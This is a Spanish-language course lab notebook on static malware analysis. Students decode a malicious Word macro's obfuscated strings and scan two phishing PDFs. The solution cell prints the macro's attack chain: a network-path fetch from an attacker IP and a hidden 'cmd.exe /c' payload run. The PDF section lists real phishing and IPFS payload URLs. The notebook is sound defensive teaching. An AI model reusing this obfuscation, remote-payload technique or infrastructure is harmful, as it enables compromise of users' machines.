<table><tr>
<td width="76"><div align="center" style="font-size:44px">📎</div></td>
<td><h1 style="margin:0">LAB 3 · El adjunto sospechoso</h1>
<b>Máster en Cyber Threat Intelligence · Módulo 06 · Sesión 44 — Análisis estático de malware</b><br>
⏱️ <b>15 minutos</b> &nbsp;·&nbsp; 🎯 Destripar una factura en Word y dos PDF de phishing sin abrirlos</td>
</tr></table>

---

## La situación

Los ejecutables son la parte fácil: la gente ya desconfía de un `.exe`.

El problema real de cualquier empresa son **los adjuntos que parecen normales**: una factura en
Word, un PDF de un escáner, un justificante de transferencia. El usuario los abre porque
*son documentos*, y ahí es donde empieza la mayoría de los incidentes.

Hoy tienes tres en la bandeja:

| Fichero | Lo que dice ser |
|---|---|
| `factura_adjunta.docx` | Una factura en Word |
| `informe_trimestral.pdf` | Un informe en PDF |
| `documento_escaneado.pdf` | Algo que alguien escaneó |

### Lo que tienes que entregar
1. 🌐 **La dirección a la que llama la macro** del documento de Word
2. ⚙️ **El comando** que acaba ejecutando
3. 🎁 *(Reto)* La **URL escondida** dentro de uno de los PDF

---
## 🔧 Preparación · ejecuta esta celda SIEMPRE

**Cada laboratorio es un cuaderno distinto y arranca en una máquina nueva.**
Aunque vengas del laboratorio anterior, aquí no hay nada instalado y las muestras
todavía no están. No se comparte nada entre cuadernos.

Pulsa ▶️ en la celda de abajo y espera unos **40 segundos**. Solo hay que hacerlo
una vez por laboratorio.

> 📦 La segunda celda, **PLAN B**, solo hace falta si la primera no consigue las
> muestras. Si la primera termina con el listado de ficheros, ignórala y sigue.


In [ ]:
#@title ▶️ EJECUTA ESTA CELDA (botón ▶ a la izquierda) y espera ~40 segundos { display-mode: "form" }

#@markdown ---
#@markdown **No hace falta que entiendas este código todavía.** Solo prepara el laboratorio:
#@markdown instala las herramientas, descarga las muestras y las descomprime.
#@markdown ---

SAMPLES_URL = "https://github.com/jstnk9/kschool_ejercicios/raw/main/analisis_estatico/muestras_kschool.zip" #@param {type:"string"}
PASSWORD    = "infected" #@param {type:"string"}

import os, glob, subprocess

def _sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

print("1/4  Instalando herramientas de análisis...")
_sh("pip install -q pyzipper pefile oletools yara-python py-tlsh")
print("     ✔ pyzipper, pefile, oletools, yara-python, tlsh")

print("2/4  Consiguiendo las muestras...")
DEST = "/content/muestras_kschool.zip"

if not SAMPLES_URL.strip():
    # Sin URL configurada: las muestras se suben a mano con la celda de abajo.
    print("     ℹ  Este cuaderno no trae URL de descarga.")
    print("        Ve a la celda de abajo, 'PLAN B', y sube el fichero")
    print("        muestras_kschool.zip que te ha pasado el profesor.")
    print("        Es un paso normal: tarda 10 segundos.")
    ok_zip = False
else:
    url = SAMPLES_URL.strip()

    # GitHub sirve DOS urls distintas para el mismo fichero:
    #   .../blob/...  -> la pagina web que lo muestra  (HTML)
    #   .../raw/...   -> el fichero de verdad
    # Si te has copiado la de la barra del navegador, la arreglamos aqui.
    if "github.com" in url and "/blob/" in url:
        url = url.replace("/blob/", "/raw/")
        print("     ℹ  URL de GitHub corregida: /blob/ -> /raw/")
    url = url.replace("?raw=true", "").replace("?raw=1", "")

    if os.path.exists(DEST):
        os.remove(DEST)      # por si un intento anterior dejo un fichero malo

    if "drive.google.com" in url:
        _sh("pip install -q gdown")
        _sh("gdown --fuzzy '" + url + "' -O " + DEST)
    else:
        _sh("wget -q --no-check-certificate '" + url + "' -O " + DEST)

    # Comprobamos que lo descargado es DE VERDAD un ZIP mirando sus primeros
    # bytes. Que es, mira tu por donde, justo lo que vas a aprender hoy:
    # un ZIP siempre empieza por 50 4B 03 04, o sea "PK".
    cabecera = open(DEST, "rb").read(4) if os.path.exists(DEST) else b""
    ok_zip = cabecera == b"PK\x03\x04"

    if ok_zip:
        print("     ✔ Descargado (" + str(os.path.getsize(DEST)//1024) + " KB, empieza por 'PK' ✔)")
    else:
        print("     ✖ Lo que he descargado NO es un ZIP.")
        print("        Empieza por los bytes " + (cabecera.hex() or "(nada)") +
              " y un ZIP empieza siempre por 504b0304.")
        if b"<" in cabecera or b"\n" in cabecera:
            print("")
            print("        Parece una pagina HTML. Lo tipico: la URL apunta a la PAGINA")
            print("        de GitHub y no al fichero. Fijate en la diferencia:")
            print("           .../blob/main/...  <- pagina web   ✖")
            print("           .../raw/main/...   <- el fichero   ✔")
            print("        Pulsa el boton 'Raw' en GitHub y copia esa URL.")
        print("")
        print("        Alternativa: usa la celda de abajo, 'PLAN B'.")

print("3/4  Descomprimiendo (contraseña: infected)...")
import pyzipper
if ok_zip:
    try:
        with pyzipper.AESZipFile(DEST) as z:
            z.setpassword(PASSWORD.encode())
            z.extractall("/content/")
        print("     ✔ Descomprimido en /content/muestras/")
    except Exception as e:
        print("     ✖ Error al descomprimir:", e)

print("4/4  Comprobando el laboratorio...")
MUESTRAS = "/content/muestras"
ficheros = sorted(f for f in glob.glob(MUESTRAS + "/*") if not f.endswith("LEEME.txt"))
if len(ficheros) >= 9:
    print("     ✔ " + str(len(ficheros)) + " muestras listas")
    print("")
    print("=" * 52)
    print("   LABORATORIO LISTO  ✅")
    print("=" * 52)
    for f in ficheros:
        print("   {:>9,} bytes   {}".format(os.path.getsize(f), os.path.basename(f)))
else:
    print("     ✖ Solo encuentro " + str(len(ficheros)) + " ficheros. Usa la celda 'PLAN B' de abajo.")

print("""
⚠️  RECUERDA: esto son muestras REALES de malware.
    Estás dentro de una máquina virtual de Google que se destruye al cerrar.
    NO descargues estos ficheros a tu ordenador. NO los ejecutes.
    Hoy solo vamos a MIRARLOS, que es justo de lo que va el análisis estático.
""")

In [ ]:
#@title 📦 PLAN B — solo si la celda de arriba no ha conseguido las muestras { display-mode: "form" }
import glob, os

# Esta celda se puede ejecutar sola, sin haber pasado por la de arriba,
# asi que se instala ella misma lo que necesita.
try:
    import pyzipper
except ImportError:
    print("Instalando pyzipper (5 segundos)...")
    import subprocess, sys
    subprocess.run([sys.executable, "-m", "pip", "install", "-q", "pyzipper"], check=False)
    import pyzipper

ZIP_YA_SUBIDO = "/content/muestras_kschool.zip"

if os.path.exists(ZIP_YA_SUBIDO):
    # ya lo habias subido con el panel de Archivos de la izquierda
    print("Encontrado", ZIP_YA_SUBIDO, "- no hace falta que lo subas otra vez.")
    nombres = [ZIP_YA_SUBIDO]
else:
    from google.colab import files
    print("Pulsa en 'Elegir archivos' y selecciona muestras_kschool.zip")
    nombres = list(files.upload())

for nombre in nombres:
    try:
        with pyzipper.AESZipFile(nombre) as z:
            z.setpassword(b"infected")
            z.extractall("/content/")
    except Exception as e:
        print("✖ No he podido abrir", nombre, "->", e)

ficheros = sorted(f for f in glob.glob("/content/muestras/*") if not f.endswith("LEEME.txt"))
if ficheros:
    print("")
    print("✔ " + str(len(ficheros)) + " muestras listas en /content/muestras/")
    for f in ficheros:
        print("   {:>9,} bytes   {}".format(os.path.getsize(f), os.path.basename(f)))
else:
    print("✖ Sigo sin ver las muestras. Avisa en el chat.")

---
# PARTE A · La factura de Word

## Paso 1 · Un `.docx` es un ZIP. Ábrelo como tal.

Desde Office 2007, los ficheros `.docx`, `.xlsx` y `.pptx` son **ficheros ZIP** con XML dentro.
Eso significa que puedes mirar lo que llevan **sin abrir Word**, que es justo lo que queremos.

In [ ]:
import zipfile

doc = "/content/muestras/factura_adjunta.docx"

with zipfile.ZipFile(doc) as z:
    print("{:>10}   {}".format("TAMAÑO", "FICHERO DENTRO DEL DOCUMENTO"))
    print("─" * 64)
    for info in sorted(z.infolist(), key=lambda i: -i.file_size):
        alerta = ""
        if info.filename.endswith(".bin"):
            alerta = "   🚩"
        print("{:>10,}   {}{}".format(info.file_size, info.filename, alerta))

### 🚨 `word/vbaProject.bin`

Ese fichero es **una macro de VBA**. 86 KB de código que se ejecuta dentro de Word.

Y aquí está la trampa, que es doble:

1. **Un `.docx` no puede tener macros.** Por definición. La `x` del final significa
   justamente *"sin macros"*. Un documento con macros es un `.docm`.
   → **Alguien ha renombrado un `.docm` a `.docx`** para que parezca inofensivo.
2. Hay también un `word/activeX/activeX1.bin`: un control ActiveX incrustado.
   Guárdalo en la cabeza, porque luego cobra sentido.

> 🔍 **Truco de triaje que puedes usar mañana mismo:** ante cualquier documento de Office
> sospechoso, ábrelo como ZIP y mira si existe `vbaProject.bin`.
> Es un chequeo de dos segundos y te resuelve el 90% de los casos.

---
## Paso 2 · Leer la macro con `olevba`

`oletools` es el paquete estándar para analizar documentos de Office. Su herramienta `olevba`
extrae el código VBA **sin abrir Word** y además lo puntúa: te marca las instrucciones peligrosas.

In [ ]:
# Dependencias de esta celda (por si la ejecutas sin pasar por la de arriba)
import importlib, subprocess, sys
for _m, _p in [("oletools", "oletools")]:
    try:
        importlib.import_module(_m)
    except ImportError:
        print('Instalando ' + _p + '...')
        subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', _p],
                       check=False)

!olevba --decode --deobf "/content/muestras/factura_adjunta.docx" 2>/dev/null | tail -60

### Mira la tabla del final. Traducida:

| Lo que marca olevba | Qué significa |
|---|---|
| `AutoExec · Document_Open` | **Se ejecuta solo al abrir el documento.** El usuario no tiene que hacer nada más. |
| `Suspicious · shell` | Lanza un programa externo |
| `Suspicious · vbHide` | …y lo lanza **con la ventana oculta**, para que no lo veas |
| `Suspicious · Chr` | Construye textos letra a letra para esconderlos |
| `Suspicious · VBA Stomping` | **El código que ves NO es el que se ejecuta** |

**"VBA Stomping" merece una explicación**, porque es un truco precioso y muy usado:

Word guarda las macros **dos veces**: el código fuente legible, y una versión precompilada
(*p-code*) que es la que realmente ejecuta. El atacante deja un código fuente inocente y
modifica solo el p-code. Resultado: **si abres la macro en el editor de Word, ves algo limpio.
Pero Word ejecuta otra cosa.**

Y ahora mira el código de arriba. ¿Ves esas llamadas por todas partes?

```vba
AA = SASD("Zd/@36091608660<3d`Ѓniq{Z|c{rdgvbmv6k{f|kt")
Set Br = Frame1.Controls(SASD("Rmv|@wv9")).Object
```

Todas las cadenas importantes están **ofuscadas** y pasan por una función propia llamada `SASD`.
Sin descifrarlas, no sabemos a dónde llama ni qué ejecuta.

Así que vamos a descifrarlas.

---
## 🧩 TU TURNO (6 minutos) — Descifra las cadenas

Buena noticia: **el atacante nos ha dejado el algoritmo**. Tiene que dejárnoslo, porque
el propio documento necesita descifrar las cadenas para funcionar. Está ahí abajo del todo:

```vba
Function SASD(ByVal Data As String) As String
    For i = 1 To Len(Data)
        If i Mod 2 = 0 Then
            charCode = Asc(Mid(Data, i, 1)) - 5     ' posiciones PARES:  -5
        Else
            charCode = Asc(Mid(Data, i, 1)) + 5     ' posiciones IMPARES: +5
        End If
        charCode = charCode - 3                      ' y a todas: -3
        result = result & Chr(charCode)
    Next i
End Function
```

En cristiano: **coge cada letra; si está en posición impar súmale 5, si está en par réstale 5;
y después réstale 3 a todas.** Eso es todo. Es un cifrado de risa, pero suficiente para que
no salga nada en las strings.

**No tienes que traducir nada a Python.** En la celda de abajo solo hay que escribir los
**tres números con su signo** que acabas de leer en el VBA. Luego pulsa ▶️.

> 🔍 Lo que estás haciendo aquí es exactamente el trabajo del analista: el atacante te
> obliga a leer *su* código para poder leer *sus* datos.


In [ ]:
#@title 🧩 TU TURNO — escribe las tres operaciones y pulsa ▶️ { display-mode: "form" }

#@markdown Según el VBA de arriba, ¿qué se le hace al código de cada letra?
#@markdown Escribe los tres números **con su signo**, por ejemplo `+5` o `-5`.

a_las_posiciones_IMPARES = "" #@param {type:"string"}
a_las_posiciones_PARES = "" #@param {type:"string"}
y_despues_a_TODAS = "" #@param {type:"string"}

# ───────── a partir de aquí no hay que tocar nada ─────────

# Las 5 cadenas ofuscadas que aparecen en la macro:
OFUSCADAS = [
    "Zd/@36091608660<3d`Ѓniq{Z|c{rdgvbmv6k{f|kt",
    "Rmv|@wv9",
    "TJQkpqn|,ZcoCЂn",
    ":)+5z5+FzD-JMLWFzD-PRUJF",
    "aub6cЂc(-k",
]


def _numero(texto):
    """Acepta '+5', '5', '-5', ' -5 '. Devuelve None si no es un numero."""
    try:
        return int(str(texto).strip().replace("+", ""))
    except ValueError:
        return None


impares, pares, todas = (_numero(a_las_posiciones_IMPARES),
                         _numero(a_las_posiciones_PARES),
                         _numero(y_despues_a_TODAS))

if impares is None or pares is None or todas is None:
    print("✋ Faltan números, o alguno no se entiende.")
    print("   Escribe los tres con su signo, por ejemplo:  +5   -5   -3")
    print("   Los tienes en el VBA de la celda de arriba, en los comentarios.")
else:
    def sasd(texto):
        """El algoritmo del atacante, con los números que has puesto tú."""
        resultado = ""
        for i, letra in enumerate(texto, start=1):   # VBA cuenta desde 1
            try:
                codigo = letra.encode("cp1251")[0]
            except Exception:
                codigo = ord(letra)
            codigo += pares if i % 2 == 0 else impares
            codigo += todas
            resultado += chr(codigo % 256)
        return resultado

    print("CADENA OFUSCADA".ljust(46), "DESCIFRADA")
    print("-" * 100)
    for o in OFUSCADAS:
        print("{:<46} {}".format(repr(o)[:44], sasd(o)))

    import hashlib
    firma = hashlib.sha256(
        "".join(sasd(o) for o in OFUSCADAS).encode("utf-8", "replace")
    ).hexdigest()[:12]

    print()
    if firma == "5107f9e8da52":
        print("✅ Eso es. Ya puedes leer lo que el atacante no quería que vieras:")
        print("   una ruta de red, un control del formulario, una librería, un patrón")
        print("   de limpieza y el programa que acaba ejecutándose.")
    else:
        print("🤔 Sale texto, pero no es el correcto: fíjate en que no significa nada.")
        print("   Repasa los signos en el VBA de arriba:")
        print("   ¿a las posiciones IMPARES se les suma o se les resta? ¿Y a las PARES?")


In [ ]:
#@title ✅ Solución del TU TURNO — descifrar la macro — ábrela solo si te has atascado (doble clic para ver el código)
def sasd(texto):
    """Traducción a Python de la función SASD del atacante."""
    resultado = ""
    for i, letra in enumerate(texto, start=1):
        # Las cadenas venían de un VBA en codepage cp1251; algunos caracteres
        # no son ASCII y hay que recuperar su valor de byte original.
        try:
            codigo = letra.encode("cp1251")[0]
        except Exception:
            codigo = ord(letra)

        codigo = codigo - 5 if i % 2 == 0 else codigo + 5   # LÍNEA 1
        codigo = codigo - 3                                  # LÍNEA 2

        resultado += chr(codigo % 256)
    return resultado


OFUSCADAS = [
    "Zd/@36091608660<3d`Ѓniq{Z|c{rdgvbmv6k{f|kt",
    "Rmv|@wv9",
    "TJQkpqn|,ZcoCЂn",
    ":)+5z5+FzD-JMLWFzD-PRUJF",
    "aub6cЂc(-k",
]

print("CADENA OFUSCADA".ljust(46), "DESCIFRADA")
print("-" * 100)
for o in OFUSCADAS:
    print("{:<46} {}".format(repr(o)[:44], sasd(o)))

print()
print("=" * 70)
print("LA CADENA DE ATAQUE COMPLETA")
print("=" * 70)
print("""
1. El usuario abre la factura      → Document_Open() se dispara solo
2. Word navega, de forma invisible, a:
        \\\\185.213.208.245\\bypass\\test\\index.mshtml
   (fíjate en las dos barras del principio: NO es una web, es una ruta de RED.
    Word la abre por WebDAV/SMB, que es una forma clásica de saltarse
    los filtros que solo miran URLs http://)
3. Se descarga un HTML y le quita las marcas <!--  -->  </BODY>  </HTML>
   usando VBScript.RegExp: lo que queda en medio es el payload real
4. Y lo pasa a:   shell "cmd.exe /c " & payload, vbHide
                                              ^^^^^^^ ventana oculta

RESULTADO: el atacante ejecuta lo que quiera en el equipo,
           y puede CAMBIARLO cuando quiera sin tocar el documento,
           porque el payload vive en su servidor, no en el fichero.
""")
print("🎯 IOC para bloquear:  185.213.208.245")

### 💡 Lo que acabas de aprender (y no es el código)

El documento **no lleva el malware dentro**. Lleva **tres líneas que van a buscarlo**.

Eso tiene consecuencias muy concretas para un analista:

- **El hash del documento no te sirve de mucho.** El atacante genera uno distinto por víctima.
- **El IOC valioso es la infraestructura:** `185.213.208.245`. Eso es lo que bloqueas,
  lo que buscas en los logs del proxy y lo que compartes con tu ISAC.
- **Si analizas el documento una semana tarde, el servidor ya no responde** y no sabrás
  qué se ejecutó. Por eso en respuesta a incidentes la velocidad lo es todo.

> Y fíjate en el detalle de las `\\` : usar una ruta de red en vez de `http://` es una
> decisión deliberada para esquivar controles. Ese tipo de detalles es lo que separa
> "esto es malo" de "esto es un actor que sabe lo que hace".

---
# 🏆 PARTE B · Los PDF (reto)

> Si has llegado hasta aquí con tiempo, sigue. Si no, lo vemos en la puesta en común.

## Paso 3 · Un PDF no es solo texto: es un programa

Mucha gente se sorprende con esto: **un PDF puede ejecutar JavaScript**, abrir cosas al
abrirse, y contener ficheros incrustados. Es un formato enorme y muy abusado.

La herramienta clásica para triarlos es **`pdfid`** de Didier Stevens, y lo único que hace es
**contar palabras clave**. En serio, eso es todo. Vamos a escribirla nosotros en 10 líneas.

In [ ]:
PALABRAS_PDF = {
    b"/OpenAction":  "🚩 Ejecuta algo NADA MÁS ABRIR el documento",
    b"/AA":          "🚩 Acción automática (al pasar de página, al enfocar...)",
    b"/JavaScript":  "🚩 Contiene JavaScript",
    b"/JS":          "🚩 Contiene JavaScript",
    b"/Launch":      "🚩 Lanza un programa externo",
    b"/EmbeddedFile":"🚩 Lleva OTRO fichero dentro",
    b"/URI":         "🔗 Enlaces a direcciones web",
    b"/ObjStm":      "⚠️  Objetos comprimidos (se usa para esconder cosas)",
    b"/RichMedia":   "⚠️  Contenido Flash / multimedia",
    b"/JBIG2Decode": "⚠️  Códec con histórico de vulnerabilidades",
    b"/AcroForm":    "📝 Formulario (pide datos al usuario)",
}

def pdfid_casero(ruta):
    datos = open(ruta, "rb").read()
    print("📕", ruta.split("/")[-1], "({:,} bytes)".format(len(datos)))
    for palabra, explicacion in PALABRAS_PDF.items():
        n = datos.count(palabra)
        if n:
            print("     {:<16} x{:<3}  {}".format(palabra.decode(), n, explicacion))
    print()

pdfid_casero("/content/muestras/informe_trimestral.pdf")
pdfid_casero("/content/muestras/documento_escaneado.pdf")

### Los dos son maliciosos, pero de formas distintas

- **`informe_trimestral.pdf`** tiene `/AcroForm` + `/URI` + `/OpenAction`:
  huele a **phishing de credenciales**. Te muestra algo tipo *"documento protegido, inicia
  sesión para verlo"* y te manda a una web a que escribas tu contraseña.
- **`documento_escaneado.pdf`** tiene `/JavaScript` + `/ObjStm`:
  usa **objetos comprimidos para esconder** su contenido de análisis superficiales.

## Paso 4 · Sacar lo que hay escondido

Dentro de un PDF, los datos van en *streams* comprimidos con zlib. Vamos a descomprimirlos
todos y a buscar URLs y JavaScript.

In [ ]:
import re, zlib

def destripar_pdf(ruta):
    datos = open(ruta, "rb").read()
    print("=" * 76)
    print("📕", ruta.split("/")[-1])
    print("=" * 76)

    urls = set(re.findall(rb"https?://[^\s\)\>\"\'<]{8,120}", datos))

    for m in re.finditer(rb"stream\r?\n(.*?)endstream", datos, re.S):
        try:
            descomprimido = zlib.decompress(m.group(1))
        except Exception:
            continue
        urls |= set(re.findall(rb"https?://[^\s\)\>\"\'<]{8,120}", descomprimido))
        for js in re.findall(rb"/JS\s*\((.{0,160}?)\)", descomprimido, re.S):
            print("   🟡 JavaScript:", js.decode(errors="replace"))

    print("   URLs encontradas:")
    for u in sorted(urls):
        u = u.decode(errors="replace")
        ruido = any(x in u for x in ("adobe.com", "w3.org", "purl.org", "dynaforms.com"))
        print("      {} {}".format("·" if ruido else "🚩", u[:110]))
    print()

destripar_pdf("/content/muestras/informe_trimestral.pdf")
destripar_pdf("/content/muestras/documento_escaneado.pdf")

### 🔎 Interpreta lo que ha salido

**En `informe_trimestral.pdf`:**

```
https://webconference.protected-forms.com/XVVZrM05UUnlXV3dyYW1WRksyeHZOa2N3TkRsNE0yWm9...
```

Fíjate en dos cosas:
- El dominio, `protected-forms.com`, está elegido para **sonar a seguridad corporativa**.
  Es la misma psicología que un phishing que se llama `verificacion-segura-banco.com`.
- Esa morralla larga del final es **el identificador de la víctima**. Cada PDF enviado lleva
  el suyo, así el atacante sabe exactamente **quién** ha picado. Igual que un enlace de
  marketing con UTM, pero para credenciales.

**En `documento_escaneado.pdf`:**

```
JavaScript:  app.alert("Lecteur non pris en charge !")
URL:         https://cloudflare-ipfs.com/ipfs/QmQYUrUxxRhuhwHEkc88XfX9egpSpm3dJKbWa5LNwaFrzN
```

- El mensaje está **en francés**: *"lector no compatible"*. Campaña dirigida a Francia.
  Otro dato de atribución y de *targeting* que sale gratis del análisis estático.
- El payload está en **IPFS**, un sistema de almacenamiento distribuido. Para el atacante es
  perfecto: no hay servidor que dar de baja, no hay dominio que bloquear, y `cloudflare-ipfs.com`
  es un dominio legítimo que muchas empresas tienen en lista blanca.

> Ese `Qm...` no es una ruta: es **el hash del propio contenido**. En IPFS el contenido se
> direcciona por su hash. Que es, curiosamente, la misma idea que llevamos usando toda la clase.

### Paso 5 · Las herramientas de verdad

Lo que hemos escrito a mano existe hecho, y mucho mejor:

| Herramienta | Para qué |
|---|---|
| **`oleid` / `olevba`** (oletools) | Documentos de Office. Lo hemos usado. |
| **`pdfid` / `pdf-parser`** (Didier Stevens) | PDF: contar palabras clave y navegar objetos |
| **`peepdf`** | PDF, con análisis interactivo de JavaScript |

Si quieres probar el `pdf-parser` original, ejecuta la celda de abajo.

In [ ]:
!wget -q https://raw.githubusercontent.com/DidierStevens/DidierStevensSuite/master/pdf-parser.py
!wget -q https://raw.githubusercontent.com/DidierStevens/DidierStevensSuite/master/pdfid.py

print("### pdfid.py ###")
!python pdfid.py "/content/muestras/documento_escaneado.pdf"

print()
print("### pdf-parser.py: buscar objetos con JavaScript ###")
!python pdf-parser.py --search javascript "/content/muestras/documento_escaneado.pdf" | head -40

---
# ✅ Antes de la puesta en común

1. 🌐 La macro de Word llama a: **`________________________`**
2. ⚙️ El comando que ejecuta es: **`________________________`**
3. 🎁 La URL escondida en el PDF francés: **`________________________`**

### Y una pregunta para pensar (la comentamos):

> De los tres adjuntos, **¿cuál te parece más peligroso para una empresa y por qué?**
>
> No hay una respuesta única. El de Word ejecuta código, pero necesita que el usuario
> habilite macros. El de phishing no ejecuta nada… pero te roba la contraseña del correo
> corporativo, que a menudo es peor.

**Siguiente:** LAB 4 · *Tu primera regla YARA* — vamos a convertir todo lo que hemos
encontrado hoy en una detección que funcione mañana.